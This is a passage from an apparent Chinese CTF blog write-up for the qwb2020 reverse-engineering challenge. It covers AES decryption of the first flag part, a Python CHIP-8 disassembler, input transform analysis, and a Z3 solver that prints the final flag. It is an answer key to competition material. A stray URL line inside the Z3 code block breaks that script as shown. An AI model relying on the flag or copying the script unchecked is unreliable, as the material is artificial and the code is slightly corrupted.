class="string">b&quot;202122232425262728292A2B2C2D2E2F&quot;</span>)</span><br><span class="line">   mode = AES.MODE_CBC</span><br><span class="line">   cryptos = AES.new(key, mode, iv)</span><br><span class="line">   <span class="built_in">print</span>(a2b_hex(text))</span><br><span class="line">   plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">   <span class="keyword">return</span> plain_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   e = encrypt(<span class="string">&quot;6c8f1d78770fe672122478c6f9a150e8\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a\x1a&quot;</span>)</span><br><span class="line"></span><br><span class="line">   d = decrypt(<span class="string">b&quot;9D7BA23CB1099A4841D16663D6AE3CABB825A9AE8B4AA6D17DC4B22AB35DE3D52B30509AD2881091771F0D86A2D3D6E16E24E94EF3F116050745EFD606454F3D&quot;</span>)</span><br><span class="line"></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;加密:&quot;</span>, e)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;解密:&quot;</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># a=&#x27;20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F&#x27;</span></span><br><span class="line"><span class="comment"># a=a.replace(&#x27; &#x27;,&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print(a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 6c8f1d78770fe672122478c6f9a150e1</span></span><br></pre></td></tr></table></figure>

<p>解得第一部分为：<em>6c8f1d78770fe672122478c6f9a150e1</em></p>
<p>输入之后就可以看到第二部分运行起来是个窗口，可以在里面输入十个16进制数值，输入完毕之后直接给个”DEAD”出来，那也就是说flag第二部分只有十位数值</p>
<p>第二部分当时题目应该是给提示了，是启动了一个chip-8模拟器，加载game.bin运行了一个游戏</p>
<style>.cbcurmhpdnjw{zoom: 67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-11.png" class="cbcurmhpdnjw" alt="img">

<style>.iiyxiqdkhwcr{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-12.png" class="iiyxiqdkhwcr" alt="img">

<p>所以主要逻辑应该就在game.bin文件里面，但是它是chip8指令集，ida解析不了，上网上搜索题解发现有用工具解决的，也有根据指令集自己编写代码来反汇编的，工具如下：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/172217">https://www.anquanke.com/post/id/172217</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/drguildo/CHIP8Decompiler">https://github.com/drguildo/CHIP8Decompiler</a></p>
<p>脚本如下：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/mattmikolay/chip-8/wiki/CHIP%E2%80%908-Instruction-Set">https://github.com/mattmikolay/chip-8/wiki/CHIP%E2%80%908-Instruction-Set</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;game.bin&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">   s = f.read()</span><br><span class="line">   s=b2a_hex(s).decode()</span><br><span class="line"><span class="comment">#    print(s)</span></span><br><span class="line"><span class="comment">#    input()</span></span><br><span class="line">j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">4</span>):</span><br><span class="line">   t = s[i:i + <span class="number">4</span>]</span><br><span class="line"><span class="comment">#    print(t)</span></span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;addr:&quot;</span> + <span class="built_in">hex</span>(j + <span class="number">0x200</span>), end=<span class="string">&quot;   &quot;</span>)</span><br><span class="line">   j += <span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span> t[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> t[<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span> <span class="keyword">and</span> t[<span class="number">2</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">          <span class="keyword">if</span> t[<span class="number">3</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;clear screen&quot;</span>)</span><br><span class="line">          <span class="keyword">elif</span> t[<span class="number">3</span>] == <span class="string">&#x27;f&#x27;</span>:   </span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;Returns from a subroutine&quot;</span>)</span><br><span class="line">          <span class="keyword">else</span>:</span><br><span class="line">              <span class="built_in">print</span>(<span class="string">&quot;call program at addr: &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;call program at addr: &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;jmp &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;call &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; equals &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; not equals &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; equals V&quot;</span> + t[<span class="number">2</span>])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; = &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; += &quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;8&#x27;</span>:</span><br><span class="line">       VX = <span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>]</span><br><span class="line">       VY = <span class="string">&quot;V&quot;</span> + t[<span class="number">2</span>]</span><br><span class="line">       <span class="keyword">if</span> t[-<span class="number">1</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; | &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; &amp; &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VX + <span class="string">&quot; ^ &quot;</span> + VY)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; += &quot;</span> + VY, <span class="string">&quot; set VF=1 if VX&gt;=255&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;5&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; -= &quot;</span> + VY, <span class="string">&quot; set VF=0 if VX&lt;=0&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;6&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; &gt;&gt;= 1&quot;</span>, <span class="string">&quot; the last one to VF&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;7&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; = &quot;</span> + VY + <span class="string">&quot; - &quot;</span> + VX, <span class="string">&quot; set VF=0 if VX&amp;lt;0&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[-<span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(VX + <span class="string">&quot; &lt;&lt;= 1&quot;</span>, <span class="string">&quot; the first one to VF&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;Invalid instruction: &quot;</span> + t)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Skips the next instruction if V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; not equals V&quot;</span> + t[<span class="number">2</span>])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;set I = &quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;jmp V0+&quot;</span> + t[<span class="number">1</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;=rand()&amp;&quot;</span> + t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;display at (V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;,&quot;</span> + <span class="string">&quot;V&quot;</span> + t[<span class="number">2</span>] + <span class="string">&quot;) for &quot;</span> + t[<span class="number">3</span>] + <span class="string">&quot;rows&quot;</span>)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;something about buttons&quot;</span>)</span><br><span class="line">   <span class="keyword">elif</span> t[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>:</span><br><span class="line">       <span class="keyword">if</span> t[<span class="number">2</span>:] == <span class="string">&#x27;29&#x27;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set I=&quot;</span> + <span class="string">&quot;V&quot;</span> + t[<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;0a&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; = button pressed&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;55&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;store V0-V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot; to addr start at I&quot;</span>)</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;65&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;store addr start at I to V0-V&quot;</span> + t[<span class="number">1</span>])</span><br><span class="line">       <span class="keyword">elif</span> t[<span class="number">2</span>:] == <span class="string">&quot;33&quot;</span>:</span><br><span class="line">           <span class="built_in">print</span>(<span class="string">&quot;set BCD(V&quot;</span> + t[<span class="number">1</span>] + <span class="string">&quot;)&quot;</span>)</span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           <span class="built_in">print</span>(t[<span class="number">2</span>:])</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;Invalid instruction: &quot;</span> + t)</span><br></pre></td></tr></table></figure>

<p>运行后得到汇编（根据chip8内存的排布规律，可执行代码从200开始）：</p>
<p>可以看到程序入口直接跳转到2ce</p>
<style>.wxhfiipcrggb{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-13.png" class="wxhfiipcrggb" alt="img">

<style>.firuhflzkuyf{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-14.png" class="firuhflzkuyf" alt="img">

<p>这里有两个主要函数928和938，928是用来读取按键输入的，938是用来把输入显示在屏幕上的</p>
<p>发现这两个函数被调用十次之后就开始运算操作了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">addr:0x438   Va = V0</span><br><span class="line">addr:0x43a   Vb = V0</span><br><span class="line">addr:0x43c   Vc = 02</span><br><span class="line">addr:0x43e   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x440   Va = Vb</span><br><span class="line">addr:0x442   V0 = Va</span><br><span class="line">addr:0x444   Va = V1</span><br><span class="line">addr:0x446   Vb = V1</span><br><span class="line">addr:0x448   Vc = 01</span><br><span class="line">addr:0x44a   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x44c   Va = Vb</span><br><span class="line">addr:0x44e   V1 = Va</span><br><span class="line">addr:0x450   Va = V2</span><br><span class="line">addr:0x452   Vb = V2</span><br><span class="line">addr:0x454   Vc = 01</span><br><span class="line">addr:0x456   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x458   Vc = 01</span><br><span class="line">addr:0x45a   Vb = Vb ^ Vc</span><br><span class="line">addr:0x45c   Va = Vb</span><br><span class="line">addr:0x45e   V2 = Va</span><br><span class="line">addr:0x460   Va = V3</span><br><span class="line">addr:0x462   Vb = V3</span><br><span class="line">addr:0x464   Vc = 03</span><br><span class="line">addr:0x466   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x468   Va = Vb</span><br><span class="line">addr:0x46a   V3 = Va</span><br><span class="line">addr:0x46c   Va = V4</span><br><span class="line">addr:0x46e   Vb = V4</span><br><span class="line">addr:0x470   Vc = 02</span><br><span class="line">addr:0x472   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x474   Va = Vb</span><br><span class="line">addr:0x476   V4 = Va</span><br><span class="line">addr:0x478   Va = V5</span><br><span class="line">addr:0x47a   Vb = V5</span><br><span class="line">addr:0x47c   Vc = 02</span><br><span class="line">addr:0x47e   Vb = Vb ^ Vc</span><br><span class="line">addr:0x480   Vc = 01</span><br><span class="line">addr:0x482   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x484   Va = Vb</span><br><span class="line">addr:0x486   V5 = Va</span><br><span class="line">addr:0x488   Va = V6</span><br><span class="line">addr:0x48a   Vb = V6</span><br><span class="line">addr:0x48c   Vc = V6</span><br><span class="line">addr:0x48e   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x490   Va = Vb</span><br><span class="line">addr:0x492   V6 = Va</span><br><span class="line">addr:0x494   Va = V7</span><br><span class="line">addr:0x496   Vb = V7</span><br><span class="line">addr:0x498   Vc = 01</span><br><span class="line">addr:0x49a   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x49c   Va = Vb</span><br><span class="line">addr:0x49e   V7 = Va</span><br><span class="line">addr:0x4a0   Va = V8</span><br><span class="line">addr:0x4a2   Vb = V8</span><br><span class="line">addr:0x4a4   Vc = 01</span><br><span class="line">addr:0x4a6   Vb = Vb ^ Vc</span><br><span class="line">addr:0x4a8   Vc = 01</span><br><span class="line">addr:0x4aa   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x4ac   Va = Vb</span><br><span class="line">addr:0x4ae   V8 = Va</span><br><span class="line">addr:0x4b0   Va = V9</span><br><span class="line">addr:0x4b2   Vb = V9</span><br><span class="line">addr:0x4b4   Vc = 02</span><br><span class="line">addr:0x4b6   Vb += Vc  set VF=1 if VX&gt;=255</span><br><span class="line">addr:0x4b8   Va = Vb</span><br><span class="line">addr:0x4ba   V9 = Va</span><br></pre></td></tr></table></figure>

<p>上面这些简单对输入值进行了处理，按键值（U0到U9），修改后值（V0到V9）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">V0 = U0 + 2</span><br><span class="line">V1 = U1 + 1</span><br><span class="line">V2 = (U2 + 1) ^ 1</span><br><span class="line">V3 = U3 + 3 </span><br><span class="line">V4 = U4 + 4</span><br><span class="line">V5 = U5 ^ 2 + 1</span><br><span class="line">V6 = U6 * 2</span><br><span class="line">V7 = U7 + 1</span><br><span class="line">V8 = U8 ^ 1 + 1</span><br><span class="line">V9 = U9 + 2</span><br></pre></td></tr></table></figure>

<p>然后接下来就是方程运算：</p>
<style>.eteudgjgfvjw{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-15.png" class="eteudgjgfvjw" alt="img">

<p>这里有个经常使用的函数27a：</p>
<style>.xtckbcpkchol{zoom:67%;}</style><img src="/2020/11/06/qwb2020-re/1763434247558-16.png" class="xtckbcpkchol" alt="img">

<p>递归相加V1次，也就是V0*V1乘法操作</p>
<p>所以方程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">V0 + 2*V1 + V2 = 0x21</span><br><span class="line">2*V0 + V1 + V2 = 42</span><br><span class="line">V0 + 2*V1 + 2*V2 = 48</span><br><span class="line">V3 + 2*V4 + V5 = 55</span><br><span class="line">2*V3 + V4 + V5 = 55</span><br><span class="line">V3 + 2*V4 + 2*V5 = 59</span><br><span class="line">V6 + 2*V7 + V8 = 31</span><br><span class="line">2*V6 + V7 + V8 = 22</span><br><span class="line">V6 + 2*V7 + 2*V8 = 32</span><br><span class="line">V9 = 5</span><br></pre></td></tr></table></figure>

<p>得到所有方程，使用Z3求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">f = [Int(<span class="string">&#x27;v%d&#x27;</span> % i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>)]</span><br><span class="line">flag = []</span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> f:</span><br><span class="line">    solver.add(c &gt;= <span class="number">0x0</span>)</span><br><span class="line">    solver.add(c &lt;= <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line">solver.add(f[<span class="number">0</span>] + <span class="number">2</span> * f[<span class="number">1</span>] + f[<span class="number">2</span>] == <span class="number">0x21</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">0</span>] + f[<span class="number">1</span>] + f[<span class="number">2</span>] == <span class="number">42</span>)</span><br><span class="line">solver.add(f[<span class="number">0</span>] + <span class="number">2</span> * f[<span class="number">1</span>] + <span class="number">2</span> * f[<span class="number">2</span>] == <span class="number">48</span>)</span><br><span class="line">solver.add(f[<span class="number">3</span>] + <span class="number">2</span> * f[<span class="number">4</span>] + f[<span class="number">5</span>] == <span class="number">55</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">3</span>] + f[<span class="number">4</span>] + f[<span class="number">5</span>] == <span class="number">55</span>)</span><br><span class="line">solver.add(f[<span class="number">3</span>] + <span class="number">2</span> * f[<span class="number">4</span>] + <span class="number">2</span> * f[<span class="number">5</span>] == <span class="number">59</span>)</span><br><span class="line">solver.add(f[<span class="number">6</span>] + <span class="number">2</span> * f[<span class="number">7</span>] + f[<span class="number">8</span>] == <span class="number">31</span>)</span><br><span class="line">solver.add(<span class="number">2</span> * f[<span class="number">6</span>] + f[<span class="number">7</span>] + f[<span class="number">8</span>] == <span class="number">22</span>)</span><br><span class="line">solver.add(f[<span class="number">6</span>] + <span class="number">2</span> * f[<span class="number">7</span>] + <span class="number">2</span> * f[<span class="number">8</span>] == <span class="number">32</span>)</span><br><span class="line">https://ctf.junior.nu1l.com/</span><br><span class="line"><span class="comment"># if solver.check() == sat:</span></span><br><span class="line"><span class="comment">#     model = solver.model()</span></span><br><span class="line"><span class="comment">#     solver.add(RecurOr(f, model))</span></span><br><span class="line"><span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    ff = [model[f[<span class="number">0</span>]].as_long() - <span class="number">2</span>, model[f[<span class="number">1</span>]].as_long() - <span class="number">1</span>, (model[f[<span class="number">2</span>]].as_long() ^ <span class="number">1</span>) - <span class="number">1</span>,</span><br><span class="line">          model[f[<span class="number">3</span>]].as_long() - <span class="number">3</span>, model[f[<span class="number">4</span>]].as_long() - <span class="number">2</span>, (model[f[<span class="number">5</span>]].as_long() - <span class="number">1</span>) ^ <span class="number">2</span>,</span><br><span class="line">          model[f[<span class="number">6</span>]].as_long() // <span class="number">2</span>, model[f[<span class="number">7</span>]].as_long() - <span class="number">1</span>, (model[f[<span class="number">8</span>]].as_long() - <span class="number">1</span>) ^ <span class="number">1</span>, <span class="number">5</span> - <span class="number">2</span>]</span><br><span class="line">    flag = <span class="string">&quot;flag&#123;6c8f1d78770fe672122478c6f9a150e1&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ff)):</span><br><span class="line">        flag += <span class="built_in">str</span>(<span class="built_in">hex</span>(ff[i]).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(flag+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># a2def12c13</span></span><br></pre></td></tr></table></figure>

<p>最后得到flag：flag{6c8f1d78770fe672122478c6f9a150e1a2def12c13}</p>
<p>参考题解：<a target="_blank" rel="noopener" href="https://rycbar77.github.io/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/">https://rycbar77.github.io/2020/08/28/2020-08-28-2020-%E5%BC%BA%E7%BD%91%E6%9D%AF-wp/</a>  （这个里面提供除AES外的两个脚本都有误，这里修改之后是正确的）</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/11/06/qwb2020-re/" data-id="cuiddWyLK-C7N3FCI6GBmIwQd" data-title="qwb2020-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2020-crypto" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/11/02/qwb2020-crypto/" class="article-date">
  <time class="dt-published" datetime="2020-11-02T03:18:11.000Z" itemprop="datePublished">2020-11-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/11/02/qwb2020-crypto/">qwb2020-crypto</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
